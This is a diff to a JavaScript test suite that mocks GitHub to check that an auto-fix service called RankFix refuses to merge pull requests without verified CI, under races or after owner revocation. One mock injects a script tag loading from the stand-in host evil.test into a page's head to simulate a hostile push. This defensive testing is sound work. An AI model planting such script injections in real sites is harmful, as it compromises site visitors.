@@ -20,14 +20,16 @@ await ensureDatabase();
 /* ------------------------------------------------------------------ fake GitHub */
 const sha = (v) => createHash("sha1").update(String(v)).digest("hex");
 function makeRepo(fullName, files, opts = {}) {
-  const commit = (fs) => sha(JSON.stringify(fs) + Math.random());
+  // Every commit is an immutable snapshot, readable by its SHA (Astra F4).
+  const snapshots = {};
+  const commit = (fs) => { const id = sha(JSON.stringify(fs) + Math.random()); snapshots[id] = { files: { ...fs } }; return id; };
   const main = { files: { ...files } }; main.sha = commit(main.files);
-  return { fullName, branches: { main }, pulls: [], deployments: [], opts, calls: [], commit, deployedFiles: { ...files }, failNext: {} };
+  return { fullName, branches: { main }, snapshots, pulls: [], deployments: [], opts, calls: [], commit, deployedFiles: { ...files }, failNext: {} };
 }
 let REPOS = {};
 let LIVE = {}; // host -> { repo, path, blocked }
 const json = (body, status = 200) => new Response(JSON.stringify(body), { status, headers: { "content-type": "application/json" } });
-const blob = (content) => ({ type: "file", content: Buffer.from(content, "utf8").toString("base64"), sha: sha("blob:" + content) });
+const blob = (content) => ({ type: "file", encoding: "base64", content: Buffer.from(content, "utf8").toString("base64"), sha: sha("blob:" + content) });
 
 function lineDiff(a, b) {
   const A = a.split("\n"), B = b.split("\n");
@@ -52,7 +54,8 @@ function github(method, path, body) {
   let mm;
   if ((mm = rpath.match(/^\/contents\/(.+)$/))) {
     const filePath = decodeURIComponent(mm[1]);
-    const branch = repo.branches[q.get("ref") || body?.branch || "main"];
+    const ref = q.get("ref") || body?.branch || "main";
+    const branch = repo.branches[ref] || repo.snapshots[ref];
     if (method === "GET") { if (!branch || branch.files[filePath] === undefined) return json({ message: "Not Found" }, 404); return json(blob(branch.files[filePath])); }
     if (method === "PUT") {
       const target = repo.branches[body.branch];
@@ -60,7 +63,10 @@ function github(method, path, body) {
       if (sha("blob:" + target.files[filePath]) !== body.sha) return json({ message: "sha mismatch" }, 409);
       target.files[filePath] = Buffer.from(body.content, "base64").toString("utf8");
       target.sha = repo.commit(target.files); target.commits = (target.commits || 0) + 1;
-      return json({ commit: { sha: target.sha } }, 200);
+      const written = target.sha;
+      // Astra F4 race: someone pushes a small change to the SAME file right after RankFix's write.
+      if (repo.opts.racePushSameFile) { target.files[filePath] = target.files[filePath].replace("</head>", "<script src=\"https://evil.test/x.js\"></script>\n</head>"); target.sha = repo.commit(target.files); }
+      return json({ commit: { sha: written } }, 200);
     }
   }
   if ((mm = rpath.match(/^\/git\/ref\/heads\/(.+)$/))) {
@@ -89,8 +95,10 @@ function github(method, path, body) {
     const sub = mm[2] || "";
     if (sub === "" && method === "GET") {
       pr.polls++;
+      // Someone pushes to the PR branch between RankFix's evaluation and its merge.
+      if (repo.opts.pushBeforeMerge && pr.polls === repo.opts.pushBeforeMerge) { head.files["templates/about.html"] = "<p>late push</p>"; head.sha = repo.commit(head.files); }
       const computing = repo.opts.mergeabilityDelay && pr.polls <= repo.opts.mergeabilityDelay;
-      return json({ ...pr, head: { ref: pr.head.ref, sha: head.sha }, mergeable: computing ? null : true, mergeable_state: computing ? "unknown" : (repo.opts.mergeableState || "clean") });
+      return json({ ...pr, head: { ref: pr.head.ref, sha: head.sha }, base: { ref: pr.base.ref, sha: repo.branches[pr.base.ref].sha }, mergeable: computing ? null : true, mergeable_state: computing ? "unknown" : (repo.opts.mergeableState || "clean") });
     }
     if (sub === "/files") {
       const changed = Object.keys(head.files).filter((f) => head.files[f] !== repo.branches[pr.base.ref].files[f]);
@@ -107,8 +115,46 @@ function github(method, path, body) {
       return json({ merged: true, sha: pr.merge_commit_sha });
     }
   }
-  if ((mm = rpath.match(/^\/commits\/[^/]+\/check-runs$/))) return json({ check_runs: repo.opts.checkRuns || [] });
-  if ((mm = rpath.match(/^\/commits\/[^/]+\/status$/))) return json({ state: "pending", total_count: 0 });
+  // CI (P0, 31 Oct): a realistic GitHub. Default: branch protection requires
+  // "build", and "build" ran successfully on exactly the head commit.
+  const ci = repo.opts.ci || "green";
+  // Server-side policy (Astra F1): an active ruleset requires "build" from GitHub
+  // Actions (app 15368) and the RankFix identity cannot bypass it.
+  if ((mm = rpath.match(/^\/rules\/branches\/([^/]+)$/))) {
+    if (ci === "rules_unreadable" || ci === "rules_unreadable_recorded") return json({ message: "Resource not accessible by integration" }, 403);
+    const checks = [{ context: "build", integration_id: 15368 }, ...(ci === "build_e2e_bypass" ? [{ context: "e2e", integration_id: 15368 }] : [])];
+    return json([{ type: "required_status_checks", ruleset_id: 9, ruleset_source_type: "Repository", parameters: { strict_required_status_checks_policy: false, required_status_checks: checks } }]);
+  }
+  if ((mm = rpath.match(/^\/rulesets\/(\d+)$/))) return json({ id: 9, enforcement: "active", current_user_can_bypass: ci === "bypass" || ci === "build_e2e_bypass" ? "always" : "never" });
+  if ((mm = rpath.match(/^\/branches\/([^/]+)\/protection$/))) return json({ message: "Branch not protected" }, 404);
+  if ((mm = rpath.match(/^\/commits\/([^/]+)\/check-runs$/))) {
+    if (ci === "checks_api_error") return json({ message: "Server Error" }, 500);
+    const headSha = mm[1];
+    const run = (name, conclusion, extra = {}) => ({ id: 1, name, status: "completed", conclusion, head_sha: headSha, app: { id: 15368 }, check_suite: { id: 77 }, ...extra });
+    if (ci === "missing") return json({ total_count: 0, check_runs: [] });
+    if (ci === "skipped") return json({ total_count: 1, check_runs: [run("build", "skipped")] });
+    // GitHub reports 3 runs but only one is ever delivered (later pages empty).
+    if (ci === "incomplete") return json({ total_count: 3, check_runs: q.get("page") === "1" ? [run("build", "success")] : [] });
+    if (ci === "random_green") return json({ total_count: 1, check_runs: [run("lint", "success")] });
+    // Two independent workflows publish "build": one failed, one passed (Astra F2).
+    if (ci === "same_name_workflows") return json({ total_count: 2, check_runs: [run("build", "failure", { id: 1, check_suite: { id: 77 } }), run("build", "success", { id: 2, check_suite: { id: 78 } })] });
+    // One workflow run (suite 77) with two jobs that are both called "build" (31 Oct).
+    if (ci === "two_jobs_same_name") return json({ total_count: 2, check_runs: [run("build", "failure", { id: 1 }), run("build", "success", { id: 2 })] });
+    // A real re-run of one job: attempt 1 failed (id 1), attempt 2 passed (id 2).
+    if (ci === "proven_rerun") return json({ total_count: 2, check_runs: [run("build", "failure", { id: 1 }), run("build", "success", { id: 2 })] });
+    if (ci === "wrong_app") return json({ total_count: 1, check_runs: [run("build", "success", { app: { id: 999 } })] });
+    return json({ total_count: 1, check_runs: [run("build", "success")] });
+  }
+  if (rpath === "/actions/runs") return json({ total_count: 1, workflow_runs: [{ id: 4242, head_sha: repo.branches[repo.pulls[0]?.head.ref]?.sha }] });
+  if (rpath === "/actions/runs/4242/jobs") {
+    const latest = ci === "proven_rerun" ? [2] : [1, 2];
+    const headSha = repo.branches[repo.pulls[0]?.head.ref]?.sha;
+    return json({ total_count: latest.length, jobs: q.get("page") === "1" ? latest.map((id) => ({ id: 900 + id, check_run_url: `https://api.github.test/repos/${repo.fullName}/check-runs/${id}`, head_sha: headSha })) : [] });
+  }
+  if ((mm = rpath.match(/^\/commits\/([^/]+)\/status$/))) {
+    if (ci === "status_api_error") return json({ message: "Server Error" }, 500);
+    return json({ sha: mm[1], state: "pending", total_count: 0, statuses: [] });
+  }
   if (rpath === "/deployments") return json(repo.deployments.filter((d) => d.sha === q.get("sha")).map((d) => ({ id: d.id, environment: d.environment, production_environment: true })));
   if ((mm = rpath.match(/^\/deployments\/(\d+)\/statuses$/))) {
     const d = repo.deployments[Number(mm[1]) - 1];
@@ -135,10 +181,16 @@ function renderSite(host) {
 }
 
 let OPENAI = null; // null = no key configured; otherwise a handler
+let BETWEEN_REQUESTS = null;
 globalThis.fetch = async (input, init = {}) => {
   const u = new URL(typeof input === "string" ? input : input.url);
   const body = init.body ? JSON.parse(init.body) : undefined;
-  if (u.host === "api.github.com") return github(init.method || "GET", u.pathname + u.search, body);
+  if (u.host === "api.github.com") {
+    // Owner actions that land WHILE RankFix evaluates (31 Oct race): run against
+    // the real database between two GitHub requests of the same evaluation.
+    if (BETWEEN_REQUESTS) { const hook = BETWEEN_REQUESTS; if (await hook(init.method || "GET", u.pathname)) BETWEEN_REQUESTS = null; }
+    return github(init.method || "GET", u.pathname + u.search, body);
+  }
   if (u.host === "api.openai.com") return OPENAI ? OPENAI(body) : new Response("{}", { status: 500 });
   if (LIVE[u.host]) return u.pathname === "/" ? renderSite(u.host) : new Response("<html><body>nf</body></html>", { status: u.pathname === "/robots.txt" ? 404 : 200, headers: { "content-type": "text/html" } });
   return new Response("nf", { status: 404 });
@@ -263,6 +315,239 @@ await scenario("B approve-and-publish inside RankFix without standing consent", 
   check(fix?.ready_for_scan, `B: ${JSON.stringify(fix).slice(0, 200)}`);
 });
 
+// P0 (31 Oct): fail-closed merge. None of these may ever reach PUT /merge.
+const noMergeScenario = (label, ci, codes, extra = {}) => scenario(`${label}: no automatic merge (${ci})`, async () => {
+  const id = label.toLowerCase().replace(/[^a-z0-9]/g, "");
+  await newUser(id);
+  const repo = freshSite(`${id}.voorbeeld.test`, `acme/${id}-shop`, { ci, ...extra });
+  const url = `https://${id}.voorbeeld.test/`;
+  const s1 = await scanSite(url);
+  const { pv } = await prepare(s1.body.scanId, ISSUE, `acme/${id}-shop`, true, url);
+  await publish(s1.body.scanId, ISSUE, `acme/${id}-shop`, pv, "publish");
+  const fix = await poll(url, ISSUE, 3);
+  check(repo.merges === undefined && !repo.calls.includes("PUT /pulls/1/merge"), `${label}: merged without CI evidence (${ci})`);
+  check(codes.includes(fix?.reason_code || "") || codes.includes(String((await db.query("SELECT last_error_code FROM pending_fixes WHERE scanned_url=$1", [url])).rows[0]?.last_error_code)), `${label}: reason ${fix?.reason_code} / ${JSON.stringify(fix).slice(0, 200)}`);
+});
+await noMergeScenario("CI1", "missing", ["REQUIRED_CHECK_MISSING"]);
+await noMergeScenario("CI2", "checks_api_error", ["CI_UNAVAILABLE"]);
+await noMergeScenario("CI3", "status_api_error", ["CI_UNAVAILABLE"]);
+await noMergeScenario("CI4", "skipped", ["REQUIRED_CHECK_NOT_SUCCESSFUL"]);
+await noMergeScenario("CI5", "incomplete", ["CI_INCOMPLETE", "CI_UNAVAILABLE"]);
+await noMergeScenario("CI6", "rules_unreadable", ["REQUIRED_CHECKS_UNDEFINED"]);
+await noMergeScenario("CI7", "green", ["HEAD_CHANGED", "UNEXPECTED_FILES"], { pushBeforeMerge: 2 });
+
+await noMergeScenario("CI10", "wrong_app", ["REQUIRED_CHECK_MISSING"]);
+await noMergeScenario("CI11", "bypass", ["NOT_SERVER_ENFORCED"]);
+await noMergeScenario("CI12", "same_name_workflows", ["CHECKS_FAILED"]);
+await noMergeScenario("CI13", "green", ["HEAD_CHANGED", "CONTENT_MISMATCH"], { racePushSameFile: true });
+await noMergeScenario("CI14", "two_jobs_same_name", ["CI_AMBIGUOUS"]);
+
+await scenario("CI15 a re-run proven by GitHub Actions (latest attempt) merges", async () => {
+  await newUser("ci15");
+  const repo = freshSite("ci15.voorbeeld.test", "acme/ci15-shop", { ci: "proven_rerun", deployPolls: 1 });
+  const url = "https://ci15.voorbeeld.test/";
+  const s1 = await scanSite(url);
+  const { pv } = await prepare(s1.body.scanId, ISSUE, "acme/ci15-shop", true, url);
+  await publish(s1.body.scanId, ISSUE, "acme/ci15-shop", pv, "publish");
+  await poll(url, ISSUE);
+  check(repo.merges === 1, `CI15: proven re-run should merge (${repo.merges})`);
+});
+
+await scenario("CI8 unreadable server rules + recorded policy: still PR-only; PATCH keeps or validates the policy", async () => {
+  await newUser("ci8");
+  const repo = freshSite("ci8.voorbeeld.test", "acme/ci8-shop", { ci: "rules_unreadable_recorded", deployPolls: 1 });
+  const url = "https://ci8.voorbeeld.test/";
+  const s1 = await scanSite(url);
+  const { pv } = await prepare(s1.body.scanId, ISSUE, "acme/ci8-shop", true, url);
+  const invalid = await call(siteRoute.PATCH, "PATCH", "/api/github/site-repository", { url, autofix_publish: true, confirm: "AUTOFIX_PUBLISH_CONSENT", required_checks: [{ context: "build", app_id: 15368 }, "lint"] });
+  check(invalid.status === 400 && invalid.body.code === "POLICY_INVALID", `CI8: invalid policy must be refused (${invalid.status})`);
+  const consent = await call(siteRoute.PATCH, "PATCH", "/api/github/site-repository", { url, autofix_publish: true, confirm: "AUTOFIX_PUBLISH_CONSENT", required_checks: [{ context: "build", app_id: 15368 }] });
+  check(consent.status === 200 && JSON.stringify(consent.body.autofix?.requiredChecks?.checks) === '[{"context":"build","app_id":15368}]', `CI8: consent ${JSON.stringify(consent.body)}`);
+  const again = await call(siteRoute.PATCH, "PATCH", "/api/github/site-repository", { url, autofix_publish: true, confirm: "AUTOFIX_PUBLISH_CONSENT" });
+  check(JSON.stringify(again.body.autofix?.requiredChecks?.checks) === '[{"context":"build","app_id":15368}]', `CI8: PATCH without the field must keep the policy ${JSON.stringify(again.body.autofix)}`);
+  await publish(s1.body.scanId, ISSUE, "acme/ci8-shop", pv, "auto");
+  await poll(url, ISSUE, 3);
+  const code = (await db.query("SELECT last_error_code FROM pending_fixes WHERE scanned_url=$1", [url])).rows[0]?.last_error_code;
+  check(repo.merges === undefined && code === "NOT_SERVER_ENFORCED", `CI8: recorded policy alone must not merge (${repo.merges}, ${code})`);
+});
+
+await scenario("CI9 a green non-required check never replaces the missing required check", async () => {
+  await newUser("ci9");
+  const repo = freshSite("ci9.voorbeeld.test", "acme/ci9-shop", { ci: "random_green" });
+  const url = "https://ci9.voorbeeld.test/";
+  const s1 = await scanSite(url);
+  const { pv } = await prepare(s1.body.scanId, ISSUE, "acme/ci9-shop", true, url);
+  await publish(s1.body.scanId, ISSUE, "acme/ci9-shop", pv, "publish");
+  await poll(url, ISSUE, 3);
+  check(repo.merges === undefined, "CI9: a non-required green check must not allow the merge");
+});
+
+// Astra F5: a stopped task can be recovered by the owner without database work
+// and without skipping a check.
+const action = (url, act) => call(statusRoute.POST, "POST", "/api/fixes/status", { url, issue_id: ISSUE, action: act });
+const lastCode = async (url) => (await db.query("SELECT status,last_error_code,auto_publish FROM pending_fixes WHERE scanned_url=$1 ORDER BY updated_at DESC LIMIT 1", [url])).rows[0];
+
+await scenario("R1 stuck on missing GitHub rules → owner enables a ruleset → resume merges", async () => {
+  await newUser("r1");
+  const repo = freshSite("r1.voorbeeld.test", "acme/r1-shop", { ci: "rules_unreadable", deployPolls: 1 });
+  const url = "https://r1.voorbeeld.test/";
+  const s1 = await scanSite(url);
+  const { pv } = await prepare(s1.body.scanId, ISSUE, "acme/r1-shop", true, url);
+  await publish(s1.body.scanId, ISSUE, "acme/r1-shop", pv, "publish");
+  let state = await lastCode(url);
+  check(state?.status === "NEEDS_ATTENTION" && state.last_error_code === "REQUIRED_CHECKS_UNDEFINED" && repo.merges === undefined, `R1: expected stop ${JSON.stringify(state)}`);
+  const site = await call(siteRoute.GET, "GET", `/api/github/site-repository?url=${encodeURIComponent(url)}`);
+  check(site.body.serverPolicy?.state === "not_enforced", `R1: dashboard must explain PR-only ${JSON.stringify(site.body.serverPolicy)}`);
+  const fix = await poll(url, ISSUE, 1);
+  check(fix?.actions?.resume === true && fix?.actions?.cancel === true, `R1: actions ${JSON.stringify(fix?.actions)}`);
+  repo.opts.ci = "green"; // owner turned on a ruleset in GitHub
+  const resumed = await action(url, "resume");
+  check(resumed.status === 200, `R1: resume ${resumed.status} ${JSON.stringify(resumed.body).slice(0, 200)}`);
+  await poll(url, ISSUE);
+  check(repo.merges === 1, `R1: should merge after resume (${repo.merges})`);
+  const site2 = await call(siteRoute.GET, "GET", `/api/github/site-repository?url=${encodeURIComponent(url)}`);
+  check(site2.body.serverPolicy?.state === "enforced", `R1: policy now enforced ${JSON.stringify(site2.body.serverPolicy)}`);
+});
+
+await scenario("R2 cancel an unmerged stopped task; a non-resumable stop cannot be resumed", async () => {
+  await newUser("r2");
+  const repo = freshSite("r2.voorbeeld.test", "acme/r2-shop", { ci: "rules_unreadable" });
+  const url = "https://r2.voorbeeld.test/";
+  const s1 = await scanSite(url);
+  const { pv } = await prepare(s1.body.scanId, ISSUE, "acme/r2-shop", true, url);
+  await publish(s1.body.scanId, ISSUE, "acme/r2-shop", pv, "publish");
+  await db.query("UPDATE pending_fixes SET last_error_code='CONTENT_MISMATCH' WHERE scanned_url=$1", [url]);
+  const refused = await action(url, "resume");
+  check(refused.status === 409 && refused.body.code === "NOT_RESUMABLE", `R2: resume must be refused (${refused.status})`);
+  const cancelled = await action(url, "cancel");
+  const state = await lastCode(url);
+  check(cancelled.status === 200 && state?.status === "CANCELLED" && state.auto_publish === false && repo.pulls[0].state === "open" && repo.merges === undefined, `R2: cancel ${cancelled.status} ${JSON.stringify(state)}`);
+  const again = await action(url, "cancel");
+  check(again.status === 404, `R2: nothing left to cancel (${again.status})`);
+});
+
+await scenario("R3 revoking AutoFix makes running tasks PR-only", async () => {
+  await newUser("r3");
+  const repo = freshSite("r3.voorbeeld.test", "acme/r3-shop", { ci: "missing" });
+  const url = "https://r3.voorbeeld.test/";
+  const s1 = await scanSite(url);
+  const { pv } = await prepare(s1.body.scanId, ISSUE, "acme/r3-shop", true, url);
+  await call(siteRoute.PATCH, "PATCH", "/api/github/site-repository", { url, autofix_publish: true, confirm: "AUTOFIX_PUBLISH_CONSENT" });
+  await publish(s1.body.scanId, ISSUE, "acme/r3-shop", pv, "auto");
+  const off = await call(siteRoute.PATCH, "PATCH", "/api/github/site-repository", { url, autofix_publish: false });
+  check(off.status === 200 && off.body.tasksMadePrOnly === 1, `R3: revoke ${JSON.stringify(off.body)}`);
+  repo.opts.ci = "green";
+  const fix = await poll(url, ISSUE, 3);
+  check(repo.merges === undefined && fix?.reason_code === "PR_AWAITING_OWNER", `R3: revoked task must not merge (${repo.merges}) ${fix?.reason_code}`);
+});
+
+await scenario("R4 legacy task without head/content evidence: recovered only when verified at the immutable head", async () => {
+  await newUser("r4");
+  const repo = freshSite("r4.voorbeeld.test", "acme/r4-shop", { ci: "rules_unreadable", deployPolls: 1 });
+  const url = "https://r4.voorbeeld.test/";
+  const s1 = await scanSite(url);
+  const { pv } = await prepare(s1.body.scanId, ISSUE, "acme/r4-shop", true, url);
+  await publish(s1.body.scanId, ISSUE, "acme/r4-shop", pv, "publish");
+  // Simulate a task created by an older RankFix version.
+  await db.query("UPDATE pending_fixes SET head_sha=NULL,approved_content_sha256=NULL,status='NEEDS_ATTENTION',last_error_code='EVIDENCE_MISSING' WHERE scanned_url=$1", [url]);
+  repo.opts.ci = "green";
+  const resumed = await action(url, "resume");
+  check(resumed.status === 200, `R4: resume ${resumed.status} ${JSON.stringify(resumed.body).slice(0, 200)}`);
+  await poll(url, ISSUE);
+  check(repo.merges === 1, `R4: verified legacy task should merge (${repo.merges})`);
+});
+
+await scenario("R5 legacy task whose PR content was changed: never recovered", async () => {
+  await newUser("r5");
+  const repo = freshSite("r5.voorbeeld.test", "acme/r5-shop", { ci: "rules_unreadable" });
+  const url = "https://r5.voorbeeld.test/";
+  const s1 = await scanSite(url);
+  const { pv } = await prepare(s1.body.scanId, ISSUE, "acme/r5-shop", true, url);
+  await publish(s1.body.scanId, ISSUE, "acme/r5-shop", pv, "publish");
+  await db.query("UPDATE pending_fixes SET head_sha=NULL,approved_content_sha256=NULL,status='NEEDS_ATTENTION',last_error_code='EVIDENCE_MISSING' WHERE scanned_url=$1", [url]);
+  const branch = repo.branches[repo.pulls[0].head.ref];
+  branch.files["templates/index.html"] += "\n<!-- changed -->"; branch.sha = repo.commit(branch.files);
+  repo.opts.ci = "green";
+  const resumed = await action(url, "resume");
+  check(resumed.status === 409 && resumed.body.code === "CONTENT_MISMATCH" && repo.merges === undefined, `R5: ${resumed.status} ${JSON.stringify(resumed.body).slice(0, 160)}`);
+});
+
+await scenario("R6 stricter policy seen while blocked survives resume; only an explicit, confirmed reset lowers it", async () => {
+  await newUser("r6");
+  const repo = freshSite("r6.voorbeeld.test", "acme/r6-shop", { ci: "build_e2e_bypass" });
+  const url = "https://r6.voorbeeld.test/";
+  const s1 = await scanSite(url);
+  const { pv } = await prepare(s1.body.scanId, ISSUE, "acme/r6-shop", true, url);
+  await publish(s1.body.scanId, ISSUE, "acme/r6-shop", pv, "publish");
+  check((await lastCode(url))?.last_error_code === "NOT_SERVER_ENFORCED", "R6: first stop expected");
+  repo.opts.ci = "green"; // bypass removed, but e2e dropped as well
+  const resumed = await action(url, "resume");
+  await poll(url, ISSUE, 3);
+  const state = await lastCode(url);
+  check(resumed.status === 200 && repo.merges === undefined && state?.last_error_code === "POLICY_WEAKENED", `R6: weaker policy after resume must not merge (${repo.merges}, ${state?.last_error_code})`);
+  const noConfirm = await call(siteRoute.PATCH, "PATCH", "/api/github/site-repository", { url, autofix_publish: false, reset_policy_floor: true });
+  check(noConfirm.status === 400 && noConfirm.body.code === "CONFIRMATION_REQUIRED", `R6: reset needs confirmation (${noConfirm.status})`);
+  const floor = (await db.query("SELECT autofix_policy_floor FROM website_repositories WHERE user_id=$1", [globalThis.__RF_USER.id])).rows[0]?.autofix_policy_floor;
+  check(/"e2e"/.test(String(floor)), `R6: repository floor keeps e2e (${floor})`);
+});
+
+// 31 Oct: revoking consent or cancelling WHILE the engine evaluates never merges.
+const raceScenario = (label, ownerAction) => scenario(`${label}: owner acts during the evaluation → no merge`, async () => {
+  const id = label.toLowerCase();
+  await newUser(id);
+  const repo = freshSite(`${id}.voorbeeld.test`, `acme/${id}-shop`, { deployPolls: 1 });
+  const url = `https://${id}.voorbeeld.test/`;
+  const s1 = await scanSite(url);
+  const { pv } = await prepare(s1.body.scanId, ISSUE, `acme/${id}-shop`, true, url);
+  await call(siteRoute.PATCH, "PATCH", "/api/github/site-repository", { url, autofix_publish: true, confirm: "AUTOFIX_PUBLISH_CONSENT" });
+  let checkReads = 0;
+  // After the first full evaluation has read CI, the owner acts.
+  BETWEEN_REQUESTS = async (method, path) => { if (/check-runs$/.test(path) && ++checkReads === 1) { await ownerAction(url); return true; } return false; };
+  await publish(s1.body.scanId, ISSUE, `acme/${id}-shop`, pv, "auto");
+  BETWEEN_REQUESTS = null;
+  await poll(url, ISSUE, 3);
+  const state = await lastCode(url);
+  check(repo.merges === undefined && !repo.calls.some((c) => c.startsWith("PUT /pulls/") && c.endsWith("/merge")), `${label}: merged after the owner stopped it (${repo.merges}) ${JSON.stringify(state)}`);
+  return state;
+});
+await raceScenario("X1", (url) => call(siteRoute.PATCH, "PATCH", "/api/github/site-repository", { url, autofix_publish: false }));
+await raceScenario("X2", (url) => action(url, "cancel"));
+
+await scenario("X3 while a merge claim is active, cancel and revoke refuse honestly; a stale claim does not block", async () => {
+  await newUser("x3");
+  const repo = freshSite("x3.voorbeeld.test", "acme/x3-shop", { ci: "missing" });
+  const url = "https://x3.voorbeeld.test/";
+  const s1 = await scanSite(url);
+  const { pv } = await prepare(s1.body.scanId, ISSUE, "acme/x3-shop", true, url);
+  await call(siteRoute.PATCH, "PATCH", "/api/github/site-repository", { url, autofix_publish: true, confirm: "AUTOFIX_PUBLISH_CONSENT" });
+  await publish(s1.body.scanId, ISSUE, "acme/x3-shop", pv, "auto");
+  await db.query("UPDATE pending_fixes SET merge_claim='worker-1',merge_claim_at=NOW() WHERE scanned_url=$1", [url]);
+  const cancel = await action(url, "cancel");
+  check(cancel.status === 409 && cancel.body.code === "MERGE_IN_PROGRESS", `X3: cancel during claim (${cancel.status} ${cancel.body.code})`);
+  const off = await call(siteRoute.PATCH, "PATCH", "/api/github/site-repository", { url, autofix_publish: false });
+  check(off.body.tasksMadePrOnly === 0 && off.body.tasksMergeInProgress === 1, `X3: revoke during claim ${JSON.stringify(off.body)}`);
+  await db.query("UPDATE pending_fixes SET merge_claim_at=NOW()-INTERVAL '10 minutes' WHERE scanned_url=$1", [url]);
+  const later = await action(url, "cancel");
+  check(later.status === 200 && repo.merges === undefined, `X3: stale claim, unmerged PR → cancel allowed (${later.status})`);
+});
+
+await scenario("U1 upgrade: an existing name-only policy is shown as invalid and kept until the owner changes it", async () => {
+  await newUser("u1");
+  freshSite("u1.voorbeeld.test", "acme/u1-shop");
+  const url = "https://u1.voorbeeld.test/";
+  const s1 = await scanSite(url);
+  await prepare(s1.body.scanId, ISSUE, "acme/u1-shop", true, url);
+  await db.query("UPDATE website_repositories SET autofix_required_checks='[\"build\"]' WHERE user_id=$1", [globalThis.__RF_USER.id]);
+  const site = await call(siteRoute.GET, "GET", `/api/github/site-repository?url=${encodeURIComponent(url)}`);
+  check(site.body.autofix?.requiredChecks?.valid === false && site.body.serverPolicy?.code === "POLICY_INVALID", `U1: ${JSON.stringify(site.body.autofix?.requiredChecks)} ${site.body.serverPolicy?.code}`);
+  await call(siteRoute.PATCH, "PATCH", "/api/github/site-repository", { url, autofix_publish: false });
+  const kept = (await db.query("SELECT autofix_required_checks FROM website_repositories WHERE user_id=$1", [globalThis.__RF_USER.id])).rows[0]?.autofix_required_checks;
+  check(kept === '["build"]', `U1: PATCH without the field must keep it (${kept})`);
+  const cleared = await call(siteRoute.PATCH, "PATCH", "/api/github/site-repository", { url, autofix_publish: false, required_checks: [] });
+  const after = (await db.query("SELECT autofix_required_checks FROM website_repositories WHERE user_id=$1", [globalThis.__RF_USER.id])).rows[0]?.autofix_required_checks;
+  check(cleared.status === 200 && after === null, `U1: explicit [] clears (${after})`);
+});
+
 await scenario("C PR-only: never merged by RankFix, shown as manual action", async () => {
   await newUser("c");
   const repo = freshSite("c.voorbeeld.test", "acme/c-shop");
@@ -340,7 +625,7 @@ await scenario("G blocked live page is never marked as fixed", async () => {
 await scenario("H AI provider down and too little page text: clear error, nothing created", async () => {
   await newUser("h");
   const repo = freshSite("h.voorbeeld.test", "acme/h-shop");
-  process.env.OPENAI_API_KEY = "test-key-not-real";
+  process.env.OPENAI_API_KEY = "sk-test-not-real"; // must look like a real key (lib/meta-description-fix.ts validates the format)
   OPENAI = () => new Response(JSON.stringify({ error: { message: "overloaded" } }), { status: 503 });
   try {
     const ai = await call(aiFixRoute.POST, "POST", "/api/ai-fix", { url: "https://h.voorbeeld.test/", issue_id: ISSUE, type: "meta_description", current: "Kort.", context: { title: "Shop", description: "Kort.", h1: "" }, issue_status: "WARNING" });
